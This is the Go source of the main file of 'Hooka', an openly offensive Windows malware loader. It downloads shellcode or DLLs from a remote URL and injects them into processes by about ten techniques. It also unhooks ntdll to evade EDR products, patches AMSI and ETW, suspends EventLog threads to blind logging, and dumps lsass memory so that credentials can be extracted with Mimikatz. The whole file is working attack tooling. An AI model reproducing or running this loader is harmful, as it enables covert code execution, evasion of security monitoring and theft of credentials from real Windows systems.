package main

import (
	"encoding/base64"
	"encoding/hex"
	"flag"
	"os"
	"strings"
	"time"

	"github.com/D3Ext/Hooka/pkg/hooka"

	l "github.com/D3Ext/maldev/logging"
)

var techniques []string = []string{"CreateRemoteThread", "CreateRemoteThreadHalos", "CreateProcess", "EnumSystemLocales", "EnumSystemLocalesHalos", "Fibers", "QueueUserApc", "UuidFromString", "EtwpCreateEtwThread", "RtlCreateUserThread", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10"}

func main() {
	var shellcode []byte
	var err error

	var sc_url string
	var sc_file string
	var dll_file string
	var dll_url string
	var technique string
	var hook_detect bool
	var unhook int
	var base64_flag bool
	var hex_flag bool
	var test_flag bool
	var amsi bool
	var etw bool
	var lsass string
	var phantom bool
	var pid int

	l.PrintBanner("Hooka!")
	l.Println(" by D3Ext - v0.1")
	time.Sleep(100 * time.Millisecond)

	flag.StringVar(&sc_url, "url", "", "remote url where shellcode is stored (e.g. http://192.168.1.37/shellcode.bin)")
	flag.StringVar(&dll_url, "remote-dll", "", "remote url where DLL is stored, especify function separated by comma (i.e. http://192.168.1.37/evil.dll,xyz)")
	flag.StringVar(&sc_file, "file", "", "path to file where shellcode is stored")
	flag.StringVar(&dll_file, "dll", "", "path to DLL you want to inject with function name sepparated by comma (i.e. evil.dll,xyz)")
	flag.StringVar(&technique, "t", "", "shellcode injection technique (default: 1):\n  1: CreateRemoteThread\n  2: CreateRemoteThreadHalos\n  3: CreateProcess\n  4: EnumSystemLocales\n  5: EnumSystemLocalesHalos\n  6: Fibers\n  7: QueueUserApc\n  8: UuidFromString\n  9: EtwpCreateEtwThread\n  10: RtlCreateUserThread  (PID required)")
	flag.BoolVar(&hook_detect, "hooks", false, "dinamically detect hooked functions by EDR")
	flag.IntVar(&unhook, "unhook", 0, "overwrite syscall memory address to bypass EDR : 1=classic, 2=full, 3=Perun's Fart")
	flag.BoolVar(&base64_flag, "b64", false, "decode base64 encoded shellcode")
	flag.BoolVar(&amsi, "amsi", false, "overwrite AmsiScanBuffer memory address to patch AMSI (Anti Malware Scan Interface)")
	flag.BoolVar(&etw, "etw", false, "overwrite EtwEventWrite memory address to patch ETW (Event Tracing for Windows)")
	flag.BoolVar(&hex_flag, "hex", false, "decode hex encoded shellcode")
	flag.BoolVar(&phantom, "phantom", false, "use Phant0m technique to suspend EventLog threads (run with high privs)")
	flag.BoolVar(&test_flag, "test", false, "test shellcode injection capabilities by spawning a calc.exe")
	flag.StringVar(&lsass, "lsass", "", "dump lsass.exe process memory into a file to extract credentials (run with high privs)")
	flag.IntVar(&pid, "pid", 0, "PID to inject shellcode into (only applies for certain techniques) (default: self)")
	flag.Parse()

	// Check if two main args were passed
	var args_check int = 0

	if sc_url != "" {
		args_check += 1
	}
	if sc_file != "" {
		args_check += 1
	}
	if dll_url != "" {
		args_check += 1
	}
	if dll_file != "" {
		args_check += 1
	}
	if test_flag {
		args_check += 1
	}
	if hook_detect {
		args_check += 1
	}
	if lsass != "" {
		args_check += 1
	}
	if phantom {
		args_check += 1
	}

	if args_check > 1 {
		l.Println()
		flag.PrintDefaults()
		l.Println("\n[-] Error: you can't use two main flags at the same time!\n")
		os.Exit(0)

	} else if args_check == 0 {
		l.Println()
		flag.PrintDefaults()
		os.Exit(0)
	}

	// Check if two encoding methods were especified
	var enc_check int

	if base64_flag {
		enc_check += 1
	}
	if hex_flag {
		enc_check += 1
	}

	if enc_check > 1 {
		l.Println()
		flag.PrintDefaults()
		l.Println("\n[-] Error: you can't use base64 and hex encoding at the same time\n")
		os.Exit(0)
	}

	if technique == "" {
		technique = "CreateRemoteThread"
	}

	// Check invalid injection technique
	var valid_t bool
	for _, t := range techniques {
		if strings.ToLower(t) == strings.ToLower(technique) {
			valid_t = true
		}
	}

	// Check if a required pid was especified
	if (strings.ToLower(technique) == "rtlcreateuserthread") || (technique == "10") {
		if pid == 0 {
			l.Println("\n[-] Error: a PID is required to inject shellcode into with this injection technique\n")
			os.Exit(0)
		}
	}

	if valid_t == false {
		l.Println()
		flag.PrintDefaults()
		l.Println("\n[-] Error: invalid shellcode injection technique! See help panel\n")
		os.Exit(0)
	}

	// Check unexpected values for unhooking flag
	if (unhook != 1) && (unhook != 2) && (unhook != 3) && (unhook != 0) { // Check if user provided a non allowed value
		l.Println()
		flag.PrintDefaults()
		l.Println("\n[-] Error: invalid unhooking technique! 1=classic, 2=full, 3=Perun's Fart\n")
		os.Exit(0)
	}

	// Main code starts here

	if sc_url != "" {

		time.Sleep(200 * time.Millisecond)
		l.Println("\n[+] Remote shellcode URL: " + sc_url)
		time.Sleep(200 * time.Millisecond)
		if pid != 0 {
			l.Println("[+] Target PID:", pid)
		} else {
			l.Println("[+] Target PID: self")
		}
		time.Sleep(200 * time.Millisecond)

		// Check shellcode encoding flags
		if base64_flag {
			l.Println("[+] Shellcode encoding: base64")
		} else if hex_flag {
			l.Println("[+] Shellcode encoding: hex")
		} else {
			l.Println("[+] No encoding was especified")
		}
		time.Sleep(300 * time.Millisecond)

		l.Println("[*] Retrieving shellcode from url...")
		shellcode, err = hooka.GetShellcodeFromUrl(sc_url)
		if err != nil { // Handle error
			l.Println("[-] An error has occurred retrieving shellcode!")
			l.Fatal(err)
		}
		time.Sleep(300 * time.Millisecond)

		if base64_flag { // Decode shellcode if necessary
			l.Println("[*] Decoding shellcode...")
			shellcode, err = base64.StdEncoding.DecodeString(string(shellcode))
			if err != nil { // Handle error
				l.Fatal(err)
			}
			time.Sleep(300 * time.Millisecond)

		} else if hex_flag {
			l.Println("[*] Decoding shellcode...")
			shellcode, err = hex.DecodeString(string(shellcode))
			if err != nil { // Handle error
				l.Fatal(err)
			}
			time.Sleep(300 * time.Millisecond)
		}

		checkAmsi(amsi)
		checkEtw(etw)
		checkUnhook(unhook, strings.ToLower(technique))

		time.Sleep(300 * time.Millisecond)
		l.Println("[*] Injecting shellcode using " + technique + " technique")

		err = hooka.Inject(shellcode, technique, pid) // Inject shellcode
		if err != nil {                               // Handle error
			l.Fatal(err)
		}

		time.Sleep(100 * time.Millisecond)
		l.Println("[+] Shellcode should be executed without errors!\n")

	} else if sc_file != "" {

		_, err := os.Stat(sc_file) // Check if file exists
		if os.IsNotExist(err) {
			l.Println("\n[-] Especified file doesn't exist!\n")
			time.Sleep(100 * time.Millisecond)
			os.Exit(0)
		}

		time.Sleep(200 * time.Millisecond) // Add some delay to let the user read info
		if pid != 0 {
			l.Println("\n[+] Target PID:", pid)
		} else {
			l.Println("\n[+] Target PID: self")
		}
		time.Sleep(200 * time.Millisecond)
		l.Println("\n[+] Shellcode file: " + sc_file)
		time.Sleep(300 * time.Millisecond)
		l.Println("[*] Getting shellcode from file...")
		time.Sleep(300 * time.Millisecond)

		shellcode, err = hooka.GetShellcodeFromFile(sc_file) // Read file and retrieve shellcode as bytes
		if err != nil {                                      // Handle error
			l.Fatal(err)
		}

		if base64_flag { // Check shellcode encoding flags
			l.Println("[+] Shellcode encoding: base64")
			shellcode, err = base64.StdEncoding.DecodeString(string(shellcode))
			if err != nil {
				l.Fatal(err)
			}

			time.Sleep(300 * time.Millisecond)
			l.Println("[*] Decoding shellcode")
			time.Sleep(300 * time.Millisecond)

		} else if hex_flag {
			l.Println("[+] Shellcode encoding: hex")
			shellcode, err = hex.DecodeString(string(shellcode))
			if err != nil { // Handle error
				l.Fatal(err)
			}

			time.Sleep(300 * time.Millisecond)
			l.Println("[*] Decoding shellcode")
			time.Sleep(300 * time.Millisecond)

		} else {
			l.Println("[+] No encoding was especified")
			time.Sleep(300 * time.Millisecond)
		}

		checkAmsi(amsi)
		checkEtw(etw)
		checkUnhook(unhook, strings.ToLower(technique))

		time.Sleep(300 * time.Millisecond)
		l.Println("[*] Injecting shellcode using " + technique + " technique")

		err = hooka.Inject(shellcode, technique, pid) // Inject shellcode
		if err != nil {                               // Handle error
			l.Fatal(err)
		}

		time.Sleep(100 * time.Millisecond)
		l.Println("[+] Shellcode should be executed without errors!\n")

	} else if dll_file != "" {

		var dll_filename string
		var dll_func string

		if strings.Contains(dll_file, ",") { // Check if a function was especified
			dll_filename = strings.Split(dll_file, ",")[0] // Get DLL path
			dll_func = strings.Split(dll_file, ",")[1]     // Get DLL function to execute
		} else {
			dll_filename = dll_file
			dll_func = ""
		}

		_, err := os.Stat(dll_filename) // Check if especified dll exists
		if os.IsNotExist(err) {
			l.Println("\n[-] Especified DLL doesn't exists!\n")
			time.Sleep(100 * time.Millisecond)
			os.Exit(0)
		}

		if pid != 0 {
			l.Println("\n[+] Target PID:", pid)
		} else {
			l.Println("\n[+] Target PID: self")
		}

		time.Sleep(200 * time.Millisecond) // Add some delay to let the user read info
		l.Println("[+] DLL file: " + dll_filename)
		time.Sleep(300 * time.Millisecond)

		if dll_func != "" {
			l.Println("[+] Function to execute: " + dll_func)
		} else {
			l.Println("[+] Function to execute: default")
		}
		time.Sleep(300 * time.Millisecond)

		l.Println("[*] Converting " + dll_filename + " to shellcode")
		shellcode, err := hooka.ConvertDllToShellcode(dll_filename, dll_func, "") // Convert DLL to shellcode
		if err != nil {                                                           // Handle error
			l.Fatal(err)
		}
		time.Sleep(300 * time.Millisecond)
		l.Println("[+] Process finished successfully!")
		time.Sleep(200 * time.Millisecond)

		checkAmsi(amsi)
		checkEtw(etw)
		checkUnhook(unhook, strings.ToLower(technique))

		time.Sleep(300 * time.Millisecond)
		l.Println("[*] Injecting shellcode using " + technique + " technique")

		err = hooka.Inject(shellcode, technique, pid) // Inject shellcode
		if err != nil {                               // Handle error
			l.Fatal(err)
		}

		time.Sleep(100 * time.Millisecond)
		l.Println("[+] Shellcode should be executed without errors!\n")

	} else if dll_url != "" {

		var dll_func string
		var dll_url string

		if len(strings.Split(dll_url, ",")) >= 2 {
			dll_func = strings.Split(dll_url, ",")[1]
			dll_url = strings.Split(dll_url, ",")[0]
		} else {
			dll_func = ""
			dll_url = strings.Split(dll_url, ",")[0]
		}

		if pid != 0 {
			l.Println("\n[+] Target PID:", pid)
		} else {
			l.Println("\n[+] Target PID: self")
		}

		time.Sleep(200 * time.Millisecond)
		if dll_func != "" {
			l.Println("[+] Function to execute: " + dll_func)
		} else {
			l.Println("[+] Function to execute: default")
		}
		time.Sleep(300 * time.Millisecond)

		l.Println("[*] Retrieving DLL from url...")
		dll_bytes, err := hooka.GetShellcodeFromUrl(dll_url)
		if err != nil { // Handle error
			l.Println("[-] An error has occurred retrieving remote dll!")
			l.Fatal(err)
		}
		time.Sleep(300 * time.Millisecond)

		if base64_flag { // Check shellcode encoding flags
			l.Println("[+] Shellcode encoding: base64")
			dll_bytes, err = base64.StdEncoding.DecodeString(string(dll_bytes))
			if err != nil {
				l.Fatal(err)
			}

			time.Sleep(300 * time.Millisecond)
			l.Println("[*] Decoding shellcode...")
			time.Sleep(300 * time.Millisecond)

		} else if hex_flag {
			l.Println("[+] Shellcode encoding: hex")
			dll_bytes, err = hex.DecodeString(string(dll_bytes))
			if err != nil { // Handle error
				l.Fatal(err)
			}

			time.Sleep(300 * time.Millisecond)
			l.Println("[*] Decoding shellcode...")
			time.Sleep(300 * time.Millisecond)

		} else {
			l.Println("[+] No encoding was especified")
			time.Sleep(300 * time.Millisecond)
		}

		l.Println("[*] Converting raw bytes to shellcode")
		shellcode, err := hooka.ConvertDllBytesToShellcode(dll_bytes, dll_func, "") // Convert DLL to shellcode
		if err != nil {                                                             // Handle error
			l.Fatal(err)
		}
		time.Sleep(300 * time.Millisecond)
		l.Println("[+] DLL converted successfully!")
		time.Sleep(200 * time.Millisecond)

		checkAmsi(amsi)
		checkEtw(etw)
		checkUnhook(unhook, strings.ToLower(technique))

		time.Sleep(300 * time.Millisecond)
		l.Println("[*] Injecting DLL shellcode using " + technique + " technique")

		err = hooka.Inject(shellcode, technique, pid) // Inject shellcode
		if err != nil {                               // Handle error
			l.Fatal(err)
		}

		time.Sleep(200 * time.Millisecond)
		l.Println("[+] Shellcode should be executed without errors!\n")

	} else if hook_detect { // Enter here if --hooks flag was especified

		l.Println("\n[*] Detecting hooked functions...")

		all_hooks, err := hooka.DetectHooks() // Get all hooked functions
		if err != nil {                       // Handle error
			l.Fatal(err)
		}
		l.Println("[+] Process finished")

		if len(all_hooks) >= 1 { // Check if hooks array contains at least one function
			time.Sleep(200 * time.Millisecond)
			l.Println("[*] Hooked functions:\n")
			for _, h := range all_hooks {
				l.Println(h)
			}
			l.Println()
			time.Sleep(200 * time.Millisecond)

		} else {
			time.Sleep(200 * time.Millisecond)
			l.Println("[+] No function is hooked!\n")
			time.Sleep(100 * time.Millisecond)
		}

	} else if test_flag {

		l.Println("\n[*] Testing with calc.exe shellcode")
		time.Sleep(200 * time.Millisecond)

		checkAmsi(amsi)
		checkEtw(etw)
		checkUnhook(unhook, strings.ToLower(technique))

		l.Println("[*] Injecting shellcode using " + technique + " technique")

		err := hooka.Inject(hooka.CalcShellcode(), technique, pid) // Inject calc.exe shellcode
		if err != nil {                                            // Handle error
			l.Fatal(err)
		}
		l.Println("[+] Shellcode should be executed!\n")

	} else if phantom {
		l.Println("\n[*] Checking high privileges")
		privs, err := hooka.CheckHighPrivs()
		if err != nil {
			l.Fatal(err)
		}
		time.Sleep(200 * time.Millisecond)

		if privs == false {
			l.Println("[-] Error: you need high privs to perform this operation!\n")
			os.Exit(0)
		}

		l.Println("[*] Searching EventLog PID")
		eventlog_pid, err := hooka.GetEventLogPid()
		if err != nil {
			l.Fatal(err)
		}

		time.Sleep(200 * time.Millisecond)
		l.Println("[+] PID found:", int(eventlog_pid))
		time.Sleep(200 * time.Millisecond)
		l.Println("[*] Enabling SeDebugPrivilege...")
		time.Sleep(200 * time.Millisecond)

		l.Println("[*] Suspending EventLog threads")
		err = hooka.Phant0mWithOutput(eventlog_pid)
		if err != nil {
			l.Fatal(err)
		}
		l.Println("[+] Threads killed successfully!\n")

	} else if lsass != "" { // Enter here if --lsass flag was especified

		if unhook == 1 {
			l.Println("\n[*] Unhooking NtReadVirtualMemory from ntdll.dll so MiniDumpWriteDump doesn't get detected")
			time.Sleep(200 * time.Millisecond)
			err := hooka.ClassicUnhook([]string{"NtReadVirtualMemory"}, "C:\\Windows\\System32\\ntdll.dll")
			if err != nil {
				l.Fatal(err)
			}

		} else if unhook == 2 {
			l.Println("\n[*] Unhooking NtReadVirtualMemory from ntdll.dll so MiniDumpWriteDump doesn't get detected")
			time.Sleep(200 * time.Millisecond)
			err := hooka.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
			if err != nil {
				l.Println("[-] An error has occurred while unhooking functions!")
				l.Fatal(err)
			}

		} else if unhook == 3 {
			l.Println("\n[*] Unhooking NtReadVirtualMemory from ntdll.dll so MiniDumpWriteDump doesn't get detected")
			time.Sleep(200 * time.Millisecond)
			err := hooka.PerunsUnhook()
			if err != nil {
				l.Println("[-] An error has occurred while unhooking functions!")
				l.Fatal(err)
			}
		}

		checkAmsi(amsi)
		checkEtw(etw)

		l.Println("[*] Dumping lsass.exe process to " + lsass)

		err := hooka.DumpLsass(lsass)
		if err != nil { // Handle error
			l.Println("[-] An error has occurred, ensure to be running as admin:")
			e := os.Remove(lsass)
			if e != nil {
				l.Fatal(e)
			}

			l.Fatalln(err)
		}

		info, err := os.Stat(lsass)
		if err != nil {
			l.Fatalln(err)
		}

		l.Println("[*]", info.Size(), "bytes were written to file")
		time.Sleep(100 * time.Millisecond)
		l.Println("[+] Process finished! Now use Mimikatz in your machine to extract credentials\n")
		time.Sleep(100 * time.Millisecond)

	}

}

func checkAmsi(check bool) {
	if check {
		l.Println("[*] Patching AMSI by overwriting AmsiScanBuffer memory address...")
		time.Sleep(200 * time.Millisecond)
		err := hooka.PatchAmsi()
		if err != nil {
			l.Println("[-] An error has occurred while overwriting memory!")
			l.Fatal(err)
		}
		time.Sleep(200 * time.Millisecond)
	}
}

func checkEtw(check bool) {
	if check {
		l.Println("[*] Patching ETW by overwriting some EtwEventWrite functions memory address...")
		time.Sleep(200 * time.Millisecond)
		err := hooka.PatchEtw()
		if err != nil {
			l.Println("[-] An error has occurred while overwriting memory!")
			l.Fatal(err)
		}
		time.Sleep(200 * time.Millisecond)
	}
}

func checkUnhook(unhook int, technique string) {
	// Unhook function(s)
	var funcs_to_unhook []string
	var lib string

	if unhook == 1 {
		l.Println("[*] Unhooking functions via Classic technique...")
		time.Sleep(200 * time.Millisecond)

		if technique == "createtemotethread" {
			funcs_to_unhook = []string{"CreateRemoteThreadEx"}
			lib = "C:\\Windows\\System32\\ntdll.dll"
		} else if technique == "createremotethreadhalos" {
			funcs_to_unhook = []string{"NtCreateThreadEx", "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory"}
			lib = "C:\\Windows\\System32\\ntdll.dll"
		} else if technique == "createprocess" {
			funcs_to_unhook = []string{"NtQueryInformationProcess"}
		} else if technique == "enumsystemlocales" {
			funcs_to_unhook = []string{"RtlMoveMemory"}
			lib = "C:\\Windows\\System32\\ntdll.dll"
		} else if technique == "enumsystemlocaleshalos" {
			funcs_to_unhook = []string{"NtAllocateVirtualMemory", "NtWriteVirtualMemory", "RtlMoveMemory"}
			lib = "C:\\Windows\\System32\\ntdll.dll"
		} else if technique == "queueuserapc" {
			funcs_to_unhook = []string{"QueueUserAPC"}
			lib = "C:\\Windows\\System32\\kernel32.dll"
		} else if technique == "fibers" {
			funcs_to_unhook = []string{"RtlCopyMemory"}
			lib = "C:\\Windows\\System32\\ntdll.dll"
		} else if technique == "uuidfromstring" {
			funcs_to_unhook = []string{"UuidFromStringA"}
			lib = "C:\\Windows\\System32\\Rpcrt4.dll"
		} else if technique == "etwpcreateetwthread" {
			funcs_to_unhook = []string{"RtlCopyMemory", "EtwpCreateEtwThread"}
			lib = "C:\\Windows:\\System32\\ntdll.dll"
		} else if technique == "rtlcreateuserthread" {
			funcs_to_unhook = []string{"RtlCreateUserThread"}
			lib = "C:\\Windows\\System32\\ntdll.dll"
		}

		err := hooka.ClassicUnhook(funcs_to_unhook, lib)
		if err != nil {
			l.Println("[-] An error has occurred while unhooking functions!")
			l.Fatal(err)
		}
		l.Println("[+] Functions have been unhooked!")

	} else if unhook == 2 {
		l.Println("[*] Unhooking functions via Full Dll technique...")
		time.Sleep(200 * time.Millisecond)
		err := hooka.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
		if err != nil {
			l.Println("[-] An error has occurred while unhooking functions!")
			l.Fatal(err)
		}
		l.Println("[+] Functions have been unhooked!")

	} else if unhook == 3 {
		l.Println("[*] Unhooking functions via Perun's Fart technique...")
		time.Sleep(200 * time.Millisecond)
		err := hooka.PerunsUnhook()
		if err != nil {
			l.Println("[-] An error has occurred while unhooking functions!")
			l.Fatal(err)
		}
		l.Println("[+] Functions have been unhooked!")
	}
}
